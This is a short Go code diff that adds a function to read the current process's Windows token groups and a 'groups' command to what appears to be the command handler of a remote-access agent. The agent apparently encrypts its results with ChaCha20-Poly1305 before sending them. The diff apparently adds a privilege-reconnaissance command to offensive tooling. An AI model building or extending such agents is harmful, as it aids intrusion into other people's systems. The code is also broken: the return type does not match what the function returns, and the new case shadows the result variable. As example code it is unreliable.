@@ -20,7 +20,26 @@ import (
 	"time"
 
 	"golang.org/x/crypto/chacha20poly1305"
+	"golang.org/x/sys/windows"
 )
+
+
+func getGroups() (SID){
+	token, err := windows.OpenCurrentProcessToken()
+	if err != nil {
+		fmt.Println("Error opening process token:", err)
+	}
+	defer token.Close()
+
+	// Get the groups associated with the user.
+	groups, err := token.GetTokenGroups()
+	if err != nil {
+		fmt.Println("Error getting token groups:", err)
+	}
+	g := fmt.Sprint(groups)
+	return g
+}
+
 
 func chacha(pass string, msg string) (enc_block []byte) {
 
@@ -210,6 +229,8 @@ func main() {
 		case "pid":
 		    pid := os.Getpid()
 		    result = fmt.Sprint(pid)
+		case "groups":
+		    result := getGroups()
 		}
 
 		toSend := string(result)
